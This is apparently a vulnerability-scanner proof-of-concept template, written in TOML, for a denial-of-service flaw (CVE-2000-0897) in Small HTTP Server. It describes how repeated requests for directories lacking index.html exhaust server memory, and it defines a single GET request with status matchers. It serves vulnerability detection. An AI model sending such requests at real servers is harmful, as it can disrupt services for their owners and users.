[info]
author = "ave"
description = "通过反复请求不包含 index.html 的目录路径，触发服务器内存泄漏导致拒绝服务。远程攻击者无需认证即可利用。"
id = "POC-AVE-2000-0653"
name = "Max Feoktistov Small HTTP Server 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0653"]
vuln_id = [
    "CVE-2000-0897",
    "AVE-2000-0653",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nonexistent-dir/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    203,
    301,
    302,
    403,
    404,
]
type = "status"
